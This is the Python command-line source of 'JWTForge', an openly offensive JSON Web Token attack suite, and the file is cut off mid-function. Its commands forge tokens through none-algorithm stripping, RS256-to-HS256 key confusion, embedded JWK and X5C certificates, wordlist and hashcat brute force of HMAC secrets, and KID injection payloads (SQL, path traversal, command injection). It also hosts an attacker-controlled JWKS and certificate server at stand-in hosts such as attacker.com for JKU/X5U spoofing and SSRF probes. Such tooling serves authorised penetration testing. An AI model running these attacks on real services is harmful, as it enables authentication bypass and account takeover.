"""
JWTForge — JWT Attack Suite
"""

import sys
import json
import os
import click
from ._rich_compat import _ensure_rich  # noqa — ensure rich is on path
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich import box

from .core.parser import JWTParser
from .core.reporter import (
    console, print_banner, print_section, print_success, print_fail,
    print_info, print_warn, print_token, display_jwt_info, display_scan_results,
    display_forged_tokens, display_brute_result, display_kid_results
)

# ─────────────────────────────────────────────────────────────────────────────
# CLI Root
# ─────────────────────────────────────────────────────────────────────────────

@click.group(invoke_without_command=True)
@click.pass_context
@click.option('--version', is_flag=True, help='Show version and exit')
def cli(ctx, version):
    """
    \b
    JWTForge — JWT Attack Suite
    All-in-one JWT exploitation: none alg, key confusion,
    brute force, KID injection, JKU/X5U spoofing and more.
    """
    if version:
        console.print("[bold cyan]JWTForge[/bold cyan] v1.0.0 — JWT Attack Suite")
        sys.exit(0)
    if ctx.invoked_subcommand is None:
        print_banner()
        console.print(ctx.get_help())


# ─────────────────────────────────────────────────────────────────────────────
# decode
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--json', 'as_json', is_flag=True, help='Output raw JSON')
def decode(token, as_json):
    """Decode and analyze a JWT token.

    \b
    Examples:
      jwtforge decode eyJhbGci...
      jwtforge decode eyJhbGci... --json
    """
    if not as_json:
        print_banner()

    parser = JWTParser(token)
    if not parser.valid_format:
        console.print("[red]✘ Invalid JWT format (expected header.payload.signature)[/red]")
        sys.exit(1)

    if as_json:
        import json as _json
        out = {
            'header': parser.header,
            'payload': parser.payload,
            'signature_b64': parser.signature_b64,
            'info': parser.describe(),
        }
        console.print(_json.dumps(out, indent=2))
        return

    description = parser.describe()
    display_jwt_info(description, token)


# ─────────────────────────────────────────────────────────────────────────────
# scan
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--pubkey', 'pubkey_file', default=None, help='RSA public key PEM file (for key confusion)')
@click.option('--wordlist', 'wordlist', default=None, help='Wordlist for brute force')
@click.option('--host', default='127.0.0.1', show_default=True, help='Attacker host for JKU/X5U')
@click.option('--port', default=8888, show_default=True, help='Attacker port for JKU/X5U')
@click.option('--output', '-o', default=None, help='Save results to JSON file')
@click.option('--no-banner', is_flag=True, help='Suppress banner')
def scan(token, pubkey_file, wordlist, host, port, output, no_banner):
    """Run ALL attacks against a JWT — find what works.

    \b
    Examples:
      jwtforge scan eyJhbGci...
      jwtforge scan eyJhbGci... --pubkey server.pub --wordlist rockyou.txt
      jwtforge scan eyJhbGci... --host 10.10.14.5 --port 9090
    """
    if not no_banner:
        print_banner()

    parser = JWTParser(token)
    if not parser.valid_format:
        console.print("[red]✘ Invalid JWT format[/red]")
        sys.exit(1)

    console.print(Panel(
        f"[bold]Target JWT:[/bold] [dim]{token[:60]}{'...' if len(token) > 60 else ''}[/dim]",
        border_style="cyan"
    ))

    description = parser.describe()
    display_jwt_info(description, token)

    results = []
    all_forged = []

    # ── Attack 1: None Algorithm ──────────────────────────────────────────────
    print_section("Attack 1: None Algorithm", "red")
    from .attacks.none_alg import attack_none
    none_results = attack_none(token)
    top_none = none_results[:3]  # Show top 3 variants in scan
    print_success(f"Generated {len(none_results)} none-alg token variants")
    for r in top_none:
        print_token(f"  none variant [{r['variant']}]", r['token'], "green")
    results.append({'attack': 'None Algorithm', 'status': 'success', 'detail': f'{len(none_results)} variants generated'})
    all_forged.extend(none_results)

    # ── Attack 2: Key Confusion ───────────────────────────────────────────────
    print_section("Attack 2: RS256→HS256 Key Confusion", "yellow")
    if pubkey_file:
        from .attacks.key_confusion import attack_key_confusion_all_algs, attack_embedded_jwk
        try:
            with open(pubkey_file, 'r') as f:
                pubkey_pem = f.read()
            kc_results = attack_key_confusion_all_algs(token, pubkey_pem)
            for r in kc_results:
                if r['status'] == 'success':
                    print_success(f"Key confusion ({r['forged_alg']}): token forged")
                    print_token(f"  [{r['forged_alg']}]", r['token'], "yellow")
                    results.append({'attack': f"Key Confusion ({r['forged_alg']})", 'status': 'success', 'detail': r['detail']})
                    all_forged.append(r)
                else:
                    print_fail(f"Key confusion failed: {r['detail']}")
                    results.append({'attack': 'Key Confusion', 'status': 'error', 'detail': r['detail']})

            # Embedded JWK
            jwk_result = attack_embedded_jwk(token)
            if jwk_result['status'] == 'success':
                print_success("Embedded JWK injection: token forged")
                print_token("  [Embedded JWK]", jwk_result['token'], "yellow")
                results.append({'attack': 'Embedded JWK', 'status': 'success', 'detail': jwk_result['detail']})
                all_forged.append(jwk_result)
        except FileNotFoundError:
            print_fail(f"Public key file not found: {pubkey_file}")
            results.append({'attack': 'Key Confusion', 'status': 'error', 'detail': f'File not found: {pubkey_file}'})
    else:
        # Try embedded JWK without pubkey
        from .attacks.key_confusion import attack_embedded_jwk
        jwk_result = attack_embedded_jwk(token)
        if jwk_result['status'] == 'success':
            print_success("Embedded JWK injection possible (no pubkey validation)")
            print_token("  [Embedded JWK]", jwk_result['token'], "yellow")
            results.append({'attack': 'Embedded JWK', 'status': 'success', 'detail': jwk_result['detail']})
            all_forged.append(jwk_result)
        print_warn("No --pubkey provided — skipping RS256→HS256 confusion (provide with --pubkey server.pub)")
        results.append({'attack': 'Key Confusion (RS256→HS256)', 'status': 'skipped', 'detail': 'Provide --pubkey for this attack'})

    # ── Attack 3: Brute Force ─────────────────────────────────────────────────
    print_section("Attack 3: Brute Force Weak Secret", "magenta")
    alg = parser.get_algorithm()
    if wordlist and alg.upper() in ('HS256', 'HS384', 'HS512'):
        from .attacks.brute_force import attack_brute_force, generate_hashcat_command
        from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

        bf_count = [0]
        with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"), transient=True) as prog:
            task = prog.add_task("Brute forcing...", total=None)

            def progress_cb(count, word):
                bf_count[0] = count
                prog.update(task, description=f"Trying #{count:,}: {word[:30]}")

            bf_result = attack_brute_force(token, wordlist, progress_cb=progress_cb)

        if bf_result['status'] == 'success':
            print_success(f"Secret found: [bold yellow]{bf_result['secret']}[/bold yellow] after {bf_result['attempts']:,} attempts")
            print_token("  [Cracked]", bf_result['token'], "green")
            results.append({'attack': 'Brute Force', 'status': 'success', 'detail': bf_result['detail']})
            all_forged.append(bf_result)
        else:
            print_fail(f"Not cracked: {bf_result['detail']}")
            results.append({'attack': 'Brute Force', 'status': 'not_found', 'detail': bf_result['detail']})

        # Show hashcat command
        hc = generate_hashcat_command(token, wordlist)
        print_info(f"Hashcat equivalent: [dim]{hc['command']}[/dim]")
    elif alg.upper() not in ('HS256', 'HS384', 'HS512'):
        print_warn(f"Algorithm {alg} is not HMAC-based — skipping brute force")
        results.append({'attack': 'Brute Force', 'status': 'skipped', 'detail': f'Algorithm {alg} is not HMAC'})
    else:
        from .attacks.brute_force import generate_hashcat_command
        hc = generate_hashcat_command(token, wordlist or 'wordlist.txt')
        print_warn("No --wordlist provided — showing hashcat command")
        console.print(f"\n  [dim]{hc['command']}[/dim]")
        results.append({'attack': 'Brute Force', 'status': 'skipped', 'detail': 'Provide --wordlist for this attack'})

    # ── Attack 4: KID Injection ───────────────────────────────────────────────
    print_section("Attack 4: KID Header Injection", "yellow")
    from .attacks.kid_injection import attack_kid_injection, get_kid_summary
    kid_counts = get_kid_summary()
    kid_results = attack_kid_injection(token, 'all')
    success_kids = [r for r in kid_results if r['status'] == 'success']
    print_success(f"Generated {len(success_kids)} KID injection payloads ({kid_counts['sql_injection']} SQL, {kid_counts['path_traversal']} path traversal, {kid_counts['command_injection']} command injection)")

    # Show top 3 per category
    shown = 0
    for r in kid_results:
        if r['status'] == 'success' and shown < 3:
            console.print(f"    [dim][{r['type']}][/dim] kid=[yellow]{r['kid_value'][:40]}[/yellow]")
            shown += 1
    if len(success_kids) > 3:
        console.print(f"    [dim]... and {len(success_kids)-3} more. Run: jwtforge kid <token> --all[/dim]")

    results.append({'attack': 'KID Injection', 'status': 'success', 'detail': f'{len(success_kids)} payloads generated'})
    all_forged.extend(kid_results[:5])  # Save top 5 to output

    # ── Attack 5: JKU Spoofing ────────────────────────────────────────────────
    print_section("Attack 5: JKU URL Spoofing", "cyan")
    from .attacks.jku_spoof import attack_jku
    jku_result = attack_jku(token, attacker_host=host, attacker_port=port)
    if jku_result['status'] == 'success':
        print_success(f"JKU forged → [bold cyan]{jku_result['jku_url']}[/bold cyan]")
        print_token("  [JKU]", jku_result['token'], "cyan")
        console.print(f"\n    [dim]Host JWKS at {jku_result['jku_url']} using: jwtforge server --port {port}[/dim]")
        results.append({'attack': 'JKU Spoofing', 'status': 'success', 'detail': jku_result['detail']})
        all_forged.append(jku_result)
    else:
        print_fail(f"JKU attack failed: {jku_result['detail']}")
        results.append({'attack': 'JKU Spoofing', 'status': 'error', 'detail': jku_result['detail']})

    # ── Attack 6: X5U / X5C Spoofing ─────────────────────────────────────────
    print_section("Attack 6: X5U/X5C Certificate Spoofing", "magenta")
    from .attacks.x5u_spoof import attack_x5u, attack_x5c_embedded
    x5u_result = attack_x5u(token, attacker_host=host, attacker_port=port)
    x5c_result = attack_x5c_embedded(token)

    if x5u_result['status'] == 'success':
        print_success(f"X5U forged → [bold magenta]{x5u_result['x5u_url']}[/bold magenta]")
        print_token("  [X5U]", x5u_result['token'], "magenta")
        results.append({'attack': 'X5U Spoofing', 'status': 'success', 'detail': x5u_result['detail']})
        all_forged.append(x5u_result)
    else:
        print_fail(f"X5U failed: {x5u_result['detail']}")
        results.append({'attack': 'X5U Spoofing', 'status': 'error', 'detail': x5u_result['detail']})

    if x5c_result['status'] == 'success':
        print_success("X5C embedded self-signed cert injection")
        print_token("  [X5C]", x5c_result['token'], "magenta")
        results.append({'attack': 'X5C Embedded', 'status': 'success', 'detail': x5c_result['detail']})
        all_forged.append(x5c_result)
    else:
        print_fail(f"X5C failed: {x5c_result['detail']}")
        results.append({'attack': 'X5C Embedded', 'status': 'error', 'detail': x5c_result['detail']})

    # ── Summary ───────────────────────────────────────────────────────────────
    display_scan_results(results)

    # ── Save output ───────────────────────────────────────────────────────────
    if output:
        import json as _json
        out_data = {
            'token': token,
            'analysis': description,
            'results': results,
            'forged_tokens': [
                {'attack': f.get('attack', ''), 'token': f.get('token', ''), 'note': f.get('note', '')}
                for f in all_forged if f.get('token')
            ],
        }
        with open(output, 'w') as f:
            _json.dump(out_data, f, indent=2)
        print_success(f"Results saved to [bold]{output}[/bold]")


# ─────────────────────────────────────────────────────────────────────────────
# none
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--claim', '-c', multiple=True, metavar='KEY=VALUE', help='Modify payload claims (e.g., -c role=admin)')
@click.option('--all-variants', 'all_variants', is_flag=True, help='Show all none-alg variants')
@click.option('--no-banner', is_flag=True)
def none(token, claim, all_variants, no_banner):
    """None algorithm attack — strip signature, bypass verification.

    \b
    Examples:
      jwtforge none eyJhbGci...
      jwtforge none eyJhbGci... -c role=admin -c sub=administrator
      jwtforge none eyJhbGci... --all-variants
    """
    if not no_banner:
        print_banner()

    from .attacks.none_alg import attack_none, attack_none_with_trailing_dot

    parser = JWTParser(token)
    payload = dict(parser.payload)

    # Apply claim modifications
    for c in claim:
        if '=' in c:
            k, v = c.split('=', 1)
            # Try to cast to int/bool
            if v.isdigit():
                v = int(v)
            elif v.lower() == 'true':
                v = True
            elif v.lower() == 'false':
                v = False
            payload[k] = v
            print_info(f"Claim modified: [yellow]{k}[/yellow] = [green]{v}[/green]")

    print_section("None Algorithm Attack", "red")

    results = attack_none(token, custom_payload=payload if claim else None)
    trailing = attack_none_with_trailing_dot(token)

    show = results if all_variants else results[:4]  # Show top 4 by default
    show += trailing[:2]

    for r in show:
        print_token(f"[{r['variant']}]", r['token'], "green")
        console.print(f"  [dim]{r['note']}[/dim]\n")

    if not all_variants:
        console.print(f"  [dim]Generated {len(results)+len(trailing)} total variants. Use --all-variants to see all.[/dim]")

    console.print()
    print_success(f"[bold green]{len(results)+len(trailing)} none-alg tokens generated[/bold green]")
    print_info("Submit each token — any that pass verification is vulnerable.")


# ─────────────────────────────────────────────────────────────────────────────
# confuse
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.argument('pubkey_file', metavar='PUBLIC_KEY_PEM')
@click.option('--alg', 'target_alg', default='HS256', show_default=True,
              type=click.Choice(['HS256', 'HS384', 'HS512']), help='Target HMAC algorithm')
@click.option('--all-algs', is_flag=True, help='Try all HMAC variants')
@click.option('--claim', '-c', multiple=True, metavar='KEY=VALUE', help='Modify payload claims')
@click.option('--no-banner', is_flag=True)
def confuse(token, pubkey_file, target_alg, all_algs, claim, no_banner):
    """RS256→HS256 algorithm confusion / key confusion attack.

    \b
    The public key is used as the HMAC secret.
    Works when the server accepts both RS256 and HS256 tokens.

    Examples:
      jwtforge confuse eyJhbGci... server.pub
      jwtforge confuse eyJhbGci... server.pub --alg HS512
      jwtforge confuse eyJhbGci... server.pub --all-algs -c role=admin
    """
    if not no_banner:
        print_banner()

    from .attacks.key_confusion import attack_key_confusion, attack_key_confusion_all_algs, attack_embedded_jwk

    parser = JWTParser(token)
    payload = dict(parser.payload)
    for c in claim:
        if '=' in c:
            k, v = c.split('=', 1)
            if v.isdigit():
                v = int(v)
            payload[k] = v
            print_info(f"Claim: [yellow]{k}[/yellow] = [green]{v}[/green]")

    try:
        with open(pubkey_file, 'r') as f:
            pubkey_pem = f.read()
    except FileNotFoundError:
        console.print(f"[red]✘ Public key file not found: {pubkey_file}[/red]")
        sys.exit(1)

    print_section("Key Confusion Attack (RS256→HS256)", "yellow")
    print_info(f"Public key loaded from: [cyan]{pubkey_file}[/cyan]")
    print_info(f"Original algorithm: [yellow]{parser.get_algorithm()}[/yellow]")

    if all_algs:
        results = attack_key_confusion_all_algs(token, pubkey_pem, payload if claim else None)
    else:
        results = [attack_key_confusion(token, pubkey_pem, target_alg, payload if claim else None)]

    for r in results:
        if r['status'] == 'success':
            print_success(f"[{r['forged_alg']}] Token forged using public key as HMAC secret")
            print_token(f"[{r['forged_alg']}] Forged Token", r['token'], "yellow")
            console.print(f"  [dim]{r['note']}[/dim]\n")
        else:
            print_fail(f"[{r.get('forged_alg', '?')}] Failed: {r['detail']}")

    # Embedded JWK
    print_section("Bonus: Embedded JWK Attack", "cyan")
    jwk_r = attack_embedded_jwk(token)
    if jwk_r['status'] == 'success':
        print_success("Embedded JWK self-signed token created")
        print_token("[Embedded JWK]", jwk_r['token'], "cyan")
        console.print(f"  [dim]{jwk_r['note']}[/dim]")
    else:
        print_fail(f"Embedded JWK: {jwk_r['detail']}")


# ─────────────────────────────────────────────────────────────────────────────
# brute
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--wordlist', '-w', required=True, help='Path to wordlist file')
@click.option('--hashcat', is_flag=True, help='Run hashcat instead of Python brute force')
@click.option('--hashcat-args', default='', help='Extra hashcat arguments')
@click.option('--claim', '-c', multiple=True, metavar='KEY=VALUE', help='Claims to embed in re-signed token')
@click.option('--no-banner', is_flag=True)
def brute(token, wordlist, hashcat, hashcat_args, claim, no_banner):
    """Brute-force weak HMAC secrets (HS256/HS384/HS512).

    \b
    Also generates the hashcat command (mode 16500) for GPU acceleration.

    Examples:
      jwtforge brute eyJhbGci... -w /usr/share/wordlists/rockyou.txt
      jwtforge brute eyJhbGci... -w secrets.txt --hashcat
      jwtforge brute eyJhbGci... -w secrets.txt -c role=admin
    """
    if not no_banner:
        print_banner()

    from .attacks.brute_force import attack_brute_force, generate_hashcat_command, run_hashcat

    parser = JWTParser(token)
    alg = parser.get_algorithm()
    print_section("Brute Force HMAC Secret", "magenta")
    print_info(f"Algorithm: [cyan]{alg}[/cyan]")
    print_info(f"Wordlist: [cyan]{wordlist}[/cyan]")

    # Show hashcat command always
    hc = generate_hashcat_command(token, wordlist)
    console.print(f"\n  [bold yellow]Hashcat command:[/bold yellow]")
    console.print(f"  [dim]{hc['command']}[/dim]")
    console.print(f"  [dim]{hc['command_with_rules']}[/dim]")
    console.print()

    if hashcat:
        print_info("Running hashcat...")
        hc_result = run_hashcat(token, wordlist, hashcat_args)
        if hc_result['status'] == 'success':
            print_success(f"Hashcat cracked secret: [bold yellow]{hc_result['secret']}[/bold yellow]")
        elif hc_result['status'] == 'error':
            print_fail(f"Hashcat error: {hc_result['detail']}")
        else:
            print_fail("Hashcat: secret not found")
        return

    if alg.upper() not in ('HS256', 'HS384', 'HS512'):
        print_warn(f"Algorithm {alg} is not HMAC-based. Brute force only works on HS256/HS384/HS512.")
        sys.exit(0)

    import time
    from rich.progress import Progress, SpinnerColumn, TextColumn

    count = [0]

    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"), transient=True, console=console) as prog:
        task = prog.add_task("Trying passwords...", total=None)

        def cb(n, w):
            count[0] = n
            prog.update(task, description=f"#{n:,} — trying: {w[:40]}")

        result = attack_brute_force(token, wordlist, progress_cb=cb)

    if result['status'] == 'success':
        # Apply claim modifications to re-signed token
        if claim:
            import hmac
            import hashlib
            import json as _json
            payload = dict(parser.payload)
            for c in claim:
                if '=' in c:
                    k, v = c.split('=', 1)
                    if v.isdigit():
                        v = int(v)
                    payload[k] = v
            from .core.parser import b64url_encode
            secret = result['secret'].encode()
            fn_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
            fn = fn_map.get(alg.upper(), hashlib.sha256)
            h = b64url_encode(_json.dumps(parser.header, separators=(',', ':')).encode())
            p = b64url_encode(_json.dumps(payload, separators=(',', ':')).encode())
            si = f"{h}.{p}".encode()
            sig = b64url_encode(hmac.new(secret, si, fn).digest())
            result['token'] = f"{h}.{p}.{sig}"
            print_info(f"Modified {len(claim)} claim(s) in re-signed token")

        display_brute_result(result['secret'], result['token'], result['attempts'], result['elapsed'])
    else:
        display_brute_result(None, token, result.get('attempts', 0), result.get('elapsed', 0))


# ─────────────────────────────────────────────────────────────────────────────
# kid
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--type', 'attack_type', default='all',
              type=click.Choice(['all', 'sql', 'path', 'cmd', 'custom']),
              show_default=True, help='Type of KID injection')
@click.option('--kid', 'custom_kid', default=None, help='Custom KID value (--type custom)')
@click.option('--secret', 'custom_secret', default=None, help='Secret to sign forged tokens with')
@click.option('--alg', 'sign_alg', default='HS256', show_default=True,
              type=click.Choice(['HS256', 'HS384', 'HS512']))
@click.option('--output', '-o', default=None, help='Save tokens to file')
@click.option('--no-banner', is_flag=True)
def kid(token, attack_type, custom_kid, custom_secret, sign_alg, output, no_banner):
    """KID header injection — SQL, path traversal, command injection.

    \b
    Examples:
      jwtforge kid eyJhbGci...
      jwtforge kid eyJhbGci... --type sql
      jwtforge kid eyJhbGci... --type path
      jwtforge kid eyJhbGci... --type custom --kid "../../dev/null" --secret ""
    """
    if not no_banner:
        print_banner()

    from .attacks.kid_injection import attack_kid_injection, get_kid_summary

    print_section(f"KID Injection Attack ({attack_type.upper()})", "yellow")

    counts = get_kid_summary()
    print_info(f"Available payloads: {counts['sql_injection']} SQL + {counts['path_traversal']} path traversal + {counts['command_injection']} command injection")

    results = attack_kid_injection(token, attack_type, custom_kid, custom_secret, sign_alg)
    display_kid_results(results)

    if output:
        import json as _json
        with open(output, 'w') as f:
            _json.dump({'results': results}, f, indent=2)
        print_success(f"Saved {len(results)} payloads to [bold]{output}[/bold]")

    success_count = sum(1 for r in results if r['status'] == 'success')
    console.print()
    print_success(f"{success_count} KID injection tokens generated")
    print_info("Test each token — one with the right kid+secret combo will bypass auth.")


# ─────────────────────────────────────────────────────────────────────────────
# jku
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--host', default='127.0.0.1', show_default=True, help='Attacker host for JWKS server')
@click.option('--port', default=8888, show_default=True, help='Port for JWKS server')
@click.option('--url', 'custom_url', default=None, help='Override JKU URL directly')
@click.option('--kid', default='jwtforge-key-1', show_default=True, help='Key ID to embed')
@click.option('--claim', '-c', multiple=True, metavar='KEY=VALUE', help='Modify payload claims')
@click.option('--serve', is_flag=True, help='Automatically start JWKS server after forging')
@click.option('--ssrf', is_flag=True, help='Generate SSRF probe tokens')
@click.option('--save-jwks', 'save_jwks', default=None, help='Save JWKS to file')
@click.option('--no-banner', is_flag=True)
def jku(token, host, port, custom_url, kid, claim, serve, ssrf, save_jwks, no_banner):
    """JKU (JWKS URL) spoofing — point token to attacker-controlled key set.

    \b
    Examples:
      jwtforge jku eyJhbGci... --host 10.10.14.5 --port 8888
      jwtforge jku eyJhbGci... --url http://attacker.com/jwks.json
      jwtforge jku eyJhbGci... --serve
      jwtforge jku eyJhbGci... --ssrf
    """
    if not no_banner:
        print_banner()

    from .attacks.jku_spoof import attack_jku, attack_jku_ssrf_probe

    parser = JWTParser(token)
    payload = dict(parser.payload)
    for c in claim:
        if '=' in c:
            k, v = c.split('=', 1)
            if v.isdigit():
                v = int(v)
            payload[k] = v

    print_section("JKU Spoofing Attack", "cyan")

    result = attack_jku(token, host, port, custom_url, kid, payload if claim else None)

    if result['status'] != 'success':
        print_fail(f"JKU attack failed: {result['detail']}")
        sys.exit(1)

    print_success(f"Forged token created — JKU → [bold cyan]{result['jku_url']}[/bold cyan]")
    print_token("[JKU Forged Token]", result['token'], "cyan")

    console.print(f"\n  [bold]JWKS to host at[/bold] [cyan]{result['jku_url']}[/cyan]:")
    console.print(Syntax(result['jwks_json'], 'json', theme='monokai', background_color='default'))

    console.print(f"\n  [bold yellow]Instructions:[/bold yellow]")
    for line in result['server_instructions'].split('\n'):
        console.print(f"  {line}")

    if save_jwks:
        import json as _json
        with open(save_jwks, 'w') as f:
            f.write(result['jwks_json'])
        print_success(f"JWKS saved to [bold]{save_jwks}[/bold]")

    if ssrf:
        print_section("SSRF Probe Tokens", "red")
        ssrf_results = attack_jku_ssrf_probe(token)
        for r in ssrf_results:
            if r['status'] == 'success':
                console.print(f"  [cyan]{r['probe_url']}[/cyan]")
                print_token("  Probe", r['token'], "red")
                console.print()

    if serve:
        from .server.jwks_server import JWKSServer
        print_section("JWKS Server", "green")
        server = JWKSServer(host='0.0.0.0', port=port)
        server.set_jwks(result['jwks'])
        server.start(blocking=False)
        print_success(f"JWKS server listening on [bold]0.0.0.0:{port}[/bold]")
        print_info(f"JWKS URL: [cyan]http://0.0.0.0:{port}/.well-known/jwks.json[/cyan]")
        print_info("Waiting for incoming requests... (Ctrl+C to stop)")
        try:
            while True:
                import time
                time.sleep(1)
                log = server.get_request_log()
                if log:
                    last = log[-1]
                    console.print(f"  [green]HIT:[/green] {last['client']} → {last['path']}")
        except KeyboardInterrupt:
            server.stop()
            print_info("Server stopped.")


# ─────────────────────────────────────────────────────────────────────────────
# x5u
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--host', default='127.0.0.1', show_default=True, help='Attacker host')
@click.option('--port', default=8888, show_default=True, help='Port for cert server')
@click.option('--url', 'custom_url', default=None, help='Override X5U URL directly')
@click.option('--cn', default='jwtforge.attacker.com', show_default=True, help='Certificate CN')
@click.option('--embedded', is_flag=True, help='Use X5C embedded cert instead of hosted (no server needed)')
@click.option('--claim', '-c', multiple=True, metavar='KEY=VALUE')
@click.option('--serve', is_flag=True, help='Start certificate server after forging')
@click.option('--save-cert', 'save_cert', default=None, help='Save certificate PEM to file')
@click.option('--no-banner', is_flag=True)
def x5u(token, host, port, custom_url, cn, embedded, claim, serve, save_cert, no_banner):
    """X5U/X5C certificate spoofing — forge JWT with attacker-controlled cert.

    \b
    X5U: Host self-signed cert at attacker URL (server needed)
    X5C: Embed self-signed cert directly in JWT header (no server needed!)

    Examples:
      jwtforge x5u eyJhbGci... --host 10.10.14.5 --port 8888
      jwtforge x5u eyJhbGci... --embedded
      jwtforge x5u eyJhbGci... --url http://attacker.com/cert.pem
    """
    if not no_banner:
        print_banner()

    from .attacks.x5u_spoof import attack_x5u as do_x5u, attack_x5c_embedded

    parser = JWTParser(token)
    payload = dict(parser.payload)
    for c in claim:
        if '=' in c:
            k, v = c.split('=', 1)
            if v.isdigit():
                v = int(v)
            payload[k] = v

    if embedded:
        print_section("X5C Embedded Certificate Attack", "magenta")
        result = attack_x5c_embedded(token, payload if claim else None)
        if result['status'] == 'success':
            print_success("X5C embedded token forged (no server required!)")
            print_token("[X5C Embedded]", result['token'], "magenta")
            console.print(f"  [dim]{result['note']}[/dim]")
        else:
            print_fail(f"X5C failed: {result['detail']}")
        return

    print_section("X5U Certificate Spoofing Attack", "magenta")
    result = do_x5u(token, host, port, custom_url, cn, payload if claim else None)

    if result['status'] != 'success':
        print_fail(f"X5U attack failed: {result['detail']}")
        sys.exit(1)

    print_success(f"Forged token — X5U → [bold magenta]{result['x5u_url']}[/bold magenta]")
    print_token("[X5U Forged Token]", result['token'], "magenta")

    console.print(f"\n  [bold yellow]Instructions:[/bold yellow]")
    for line in result['server_instructions'].split('\n'):
        console.print(f"  {line}")

    if save_cert:
        with open(save_cert, 'w') as f:
            f.write(result['cert_pem'])
        print_success(f"Certificate saved to [bold]{save_cert}[/bold]")

    if serve:
        from .server.jwks_server import JWKSServer
        print_section("Certificate Server", "green")
        server = JWKSServer(host='0.0.0.0', port=port)
        server.set_cert(result['cert_pem'])
        server.start(blocking=False)
        print_success(f"Cert server on [bold]0.0.0.0:{port}[/bold]")
        print_info(f"Cert URL: [magenta]http://0.0.0.0:{port}/cert.pem[/magenta]")
        try:
            import time
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()


# ─────────────────────────────────────────────────────────────────────────────
# server
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.option('--port', default=8888, show_default=True, help='Port to listen on')
@click.option('--host', default='0.0.0.0', show_default=True, help='Host to bind')
@click.option('--jwks', 'jwks_file', default=None, help='JWKS JSON file to serve')
@click.option('--cert', 'cert_file', default=None, help='Certificate PEM file to serve')
@click.option('--no-banner', is_flag=True)
def server(port, host, jwks_file, cert_file, no_banner):
    """Start attacker-controlled JWKS / certificate server.

    \b
    Serves:
      GET /.well-known/jwks.json  → JWKS (for JKU attacks)
      GET /cert.pem               → X.509 cert (for X5U attacks)

    Examples:
      jwtforge server
      jwtforge server --port 9090 --jwks my.jwks.json
      jwtforge server --cert cert.pem --port 8080
    """
    if not no_banner:
        print_banner()

    from .server.jwks_server import JWKSServer

    srv = JWKSServer(host=host, port=port)

    if jwks_file:
        import json as _json
        with open(jwks_file, 'r') as f:
            srv.set_jwks(_json.load(f))
        print_info(f"Loaded JWKS from [cyan]{jwks_file}[/cyan]")

    if cert_file:
        with open(cert_file, 'r') as f:
            srv.set_cert(f.read())
        print_info(f"Loaded certificate from [magenta]{cert_file}[/magenta]")

    print_section("JWKS Server Running", "green")
    print_success(f"Listening on [bold]http://{host}:{port}[/bold]")
    print_info(f"JWKS endpoint : [cyan]http://{host}:{port}/.well-known/jwks.json[/cyan]")
    print_info(f"Cert endpoint : [magenta]http://{host}:{port}/cert.pem[/magenta]")
    print_info("Watching for incoming requests... (Ctrl+C to stop)")
    console.print()

    seen = 0
    try:
        srv.start(blocking=False)
        import time
        while True:
            time.sleep(0.5)
            log = srv.get_request_log()
            if len(log) > seen:
                for req in log[seen:]:
                    console.print(
                        f"  [bold green][HIT][/bold green] "
                        f"[cyan]{req['time']}[/cyan] "
                        f"[yellow]{req['client']}[/yellow] → "
                        f"[white]{req['path']}[/white]"
                    )
                seen = len(log)
    except KeyboardInterrupt:
        srv.stop()
        console.print()
        print_info(f"Server stopped. Total requests received: [bold]{seen}[/bold]")


# ─────────────────────────────────────────────────────────────────────────────
# forge
# ─────────────────────────────────────────────────────────────────────────────

@cli.command()
@click.argument('token')
@click.option('--claim', '-c', multiple=True, metavar='KEY=VALUE', help='Set payload claims')
@click.option('--header', '-H', 'header_claim', multiple=True, metavar='KEY=VALUE', help='Set header claims')
@click.option('--secret', '-s', default=None, help='HMAC secret for HS* algorithms')
@click.option('--privkey', 'privkey_file', default=None, help='RSA private key PEM for RS* algorithms')
@click.option('--no-sig', is_flag=True, help='Produce unsigned token (none alg)')
@click.option('--no-banner', is_flag=True)
def forge(token, claim, header_claim, secret, privkey_file, no_sig, no_banner):
    """Manually forge a JWT with custom claims and signing.

    \b
    Examples:
      jwtforge forge eyJhbGci... -c sub=admin -c role=administrator --secret mysecret
      jwtforge forge eyJhbGci... -c admin=true --privkey rsa.key
      jwtforge forge eyJhbGci... -c sub=1337 --no-sig
    """
    if not no_banner:
        print_banner()

    import hmac
    import hashlib
    import json as _json

    parser = JWTParser(token)
    new_payload = dict(parser.payload)
    new_header = dict(parser.header)

    for c in claim:
        if '=' in c:
            k, v = c.split('=', 1)
            if v.isdigit():
                v = int(v)
            elif v.lower() == 'true':
                v = True
            elif v.lower() == 'false':
                v = False
            new_payload[k] = v

    for c in header_claim:
        if '=' in c:
            k, v = c.split('=', 1)
            new_header[k] = v

    print_section("Manual Forge", "green")

    if no_sig:
        new_header['alg'] = 'none'
        forged = parser.forge(new_header, new_payload, '')
        print_success("Unsigned token (alg=none)")
        print_token("[Forged - No Signature]", forged, "green")
        return

    alg = new_header.get('alg', 'HS256').upper()
    from .core.parser import b64url_encode

    h = b64url_encode(_json.dumps(new_header, separators=(',', ':')).encode())
    p = b64url_encode(_json.dumps(new_payload, separators=(',', ':')).encode())
    si = f"{h}.{p}".encode()

    if secret and alg.startswith('HS'):
        fn_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
        fn = fn_map.get(alg, hashlib.sha256)
        sig = b64url_encode(hmac.new(secret.encode(), si, fn).digest())
        forged = f"{h}.{p}.{sig}"
